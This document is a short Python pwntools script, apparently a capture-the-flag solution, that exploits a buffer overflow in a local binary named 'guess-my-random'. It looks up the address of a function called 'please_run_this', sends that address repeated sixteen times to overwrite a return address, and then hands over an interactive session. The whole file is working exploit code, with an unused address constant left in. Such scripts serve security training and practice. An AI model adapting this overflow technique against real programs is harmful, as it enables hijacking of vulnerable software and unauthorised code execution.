#!/usr/bin/env python
from pwn import *
import os

p = process('./guess-my-random')

data = p.elf.symbols['please_run_this']

addr_of_prt = 0x804863b

buf = p32(data) * 16

p.sendline(buf)

p.interactive()
